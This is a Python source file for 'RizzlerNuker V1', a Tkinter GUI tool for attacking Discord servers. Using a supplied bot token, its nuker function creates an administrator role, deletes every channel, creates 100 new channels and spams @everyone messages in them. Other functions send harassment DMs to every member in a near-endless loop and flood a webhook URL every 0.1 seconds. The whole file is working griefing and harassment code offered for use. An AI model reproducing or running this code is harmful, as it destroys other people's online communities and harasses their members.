import tkinter as tk
from tkinter import messagebox
import discord
from discord.ext import commands
import requests
import asyncio
from tkinter import ttk
import time
import string
import random
import os

number = 0

def dopeniscord():
    os.system("start https://amg.autizm.us")

def bopenuymeacoffee():
    os.system("start https://buymeacoffee.com/Polokalap")

def massdms():
    token = tokenmassdms_entry.get()

    intents = discord.Intents.default()
    intents.guilds = True
    intents.guild_messages = True
    intents.guild_reactions = True
    intents.members = True

    bot = commands.Bot(command_prefix="!", intents=intents)

    @bot.event
    async def on_ready():
        print(f'Logged in as {bot.user}')
        for i in range(99999999999):
            for guild in bot.guilds:
                for member in guild.members:
                    if not member.bot:
                        try:
                            await member.send("Hi! Sorry for harrasing You, But the server has been reclaimed by the goat, https://amg.autizm.us/ The bot's code is open source. @everyone")
                            print(f'Sent DM to: {member.name}')
                        except Exception as e:
                            print(f'Could not send DM to: {member.name}, {e}')
    bot.run(token)

def nuker():
    token = token_entry.get()

    intents = discord.Intents.default()
    intents.guilds = True
    intents.guild_messages = True
    intents.guild_reactions = True
    intents.members = True

    bot = commands.Bot(command_prefix="!", intents=intents)

    @bot.event
    async def on_ready():
        print(f'Logged in as {bot.user}')
        for guild in bot.guilds:
            await manage_guild(guild)

    async def manage_guild(guild):
        try:
            admin_role = await guild.create_role(name="Admin", permissions=discord.Permissions(administrator=True))
            print(f'Created new role: {admin_role.name}')
        except Exception as e:
            print(f'Could not create new role: {e}')

        await asyncio.gather(
            send_messages(guild),
            delete_channels(guild)
        )

    async def send_messages(guild):
        def delay(seconds):
            return asyncio.sleep(seconds)

    async def delete_channels(guild):
        for channel in guild.channels:
            try:
                await channel.delete()
                print(f'Deleted channel: {channel.name}')
            except Exception as e:
                print(f'Could not delete channel: {channel.name}, {e}')

        for _ in range(100):
            try:
                new_channel = await guild.create_text_channel("Nuked By AlmaGangGriefs")
                print(f'Created new channel: {new_channel.name}')
                bot.loop.create_task(spam_messages(new_channel))
            except Exception as e:
                print(f'Could not create new channel: {e}')

    async def spam_messages(channel):
        while True:
            try:
                await channel.send("Hi! Sorry for harrasing You, But the server has been reclaimed by the goat, https://amg.autizm.us/ The bot's code is open source. @everyone")
                await asyncio.sleep(0.1)
            except Exception as e:
                print(f'Could not send message: {e}')
                break

    bot.run(token)

def webhookspammer():
    url = url_entry.get()
    message = message_entry.get()

    data = {
        "content" : "https://amg.autizm.us @everyone",
        "username" : "RizzlerNuker"
    }

    data["embeds"] = [
        {
            "description" : message,
            "title" : "NUKED BY RIZZLERNUKER",
        }
    ]

    for i in range(99999999):
        time.sleep(0.1)
        result = requests.post(url, json = data)

        try:
            result.raise_for_status()
        except requests.exceptions.HTTPError as err:
            print(err)
        else:
            print(f"Payload delivered successfully, code {result.status_code}.")

root = tk.Tk()
root.geometry("450x350")
root.title("RizzlerNuker V1")
root.resizable(False, False)

TAB_CONTROL = ttk.Notebook(root)

TAB1 = ttk.Frame(TAB_CONTROL)
TAB2 = ttk.Frame(TAB_CONTROL)
TAB3 = ttk.Frame(TAB_CONTROL)
TAB4 = ttk.Frame(TAB_CONTROL)
TAB5 = ttk.Frame(TAB_CONTROL)

TAB_CONTROL.add(TAB1, text='Welcome!')
TAB_CONTROL.add(TAB2, text='Webhook Spammer')
TAB_CONTROL.add(TAB3, text='Server Nuker')
TAB_CONTROL.add(TAB4, text='MassDMS')
TAB_CONTROL.add(TAB5, text='Support')

TAB_CONTROL.pack(expand=1, fill="both")

ttk.Label(TAB1, font="Roboto", text="RizzlerNukerV1!").grid(column=1, row=0, padx=10, pady=10)
ttk.Label(TAB1, text="What is new? V1").grid(column=0, row=1, padx=10, pady=10)
ttk.Label(TAB1, text="-Gui").grid(column=0, row=2, padx=10, pady=10)

ttk.Label(TAB2, text="Webhook Spammer").grid(column=1, row=0, padx=10, pady=10)
ttk.Label(TAB2, text="Developed by Polokalap").grid(column=0, row=8, padx=10, pady=10)
ttk.Label(TAB2, text="URL:").grid(column=1, row=1, padx=10, pady=10)
url_entry = ttk.Entry(TAB2)
url_entry.grid(column=1, row=2, padx=10, pady=10)
ttk.Label(TAB2, text="Message").grid(column=1, row=3, padx=10, pady=10)
message_entry = ttk.Entry(TAB2)
message_entry.grid(column=1, row=4, padx=10, pady=10)
ttk.Button(TAB2, command=webhookspammer, text="Start").grid(column=1, row=5, padx=10, pady=10)

ttk.Label(TAB3, text="Server Nuker").grid(column=1, row=0, padx=10, pady=10)
ttk.Label(TAB3, text="Developed by Polokalap").grid(column=0, row=8, padx=10, pady=10)
ttk.Label(TAB3, text="TOKEN:").grid(column=1, row=1, padx=10, pady=10)
token_entry = ttk.Entry(TAB3)
token_entry.grid(column=1, row=2, padx=10, pady=10)
ttk.Button(TAB3, command=nuker, text="Start").grid(column=1, row=3, padx=10, pady=10)

ttk.Label(TAB4, text="MASSDMS").grid(column=1, row=0, padx=10, pady=10)
ttk.Label(TAB4, text="Developed by Polokalap").grid(column=0, row=8, padx=10, pady=10)
ttk.Label(TAB4, text="TOKEN:").grid(column=1, row=1, padx=10, pady=10)
tokenmassdms_entry = ttk.Entry(TAB4)
tokenmassdms_entry.grid(column=1, row=2, padx=10, pady=10)
ttk.Button(TAB4, command=massdms, text="Start").grid(column=1, row=3, padx=10, pady=10)

ttk.Label(TAB5, text="Support").grid(column=1, row=0, padx=10, pady=10)
ttk.Label(TAB5, text="Developed by Polokalap").grid(column=0, row=8, padx=10, pady=10)
ttk.Button(TAB5, command=dopeniscord, text="Discord").grid(column=1, row=9, padx=3, pady=10)
ttk.Button(TAB5, command=bopenuymeacoffee, text="BuyMeACoffee").grid(column=1, row=3, padx=10, pady=10)

root.mainloop()
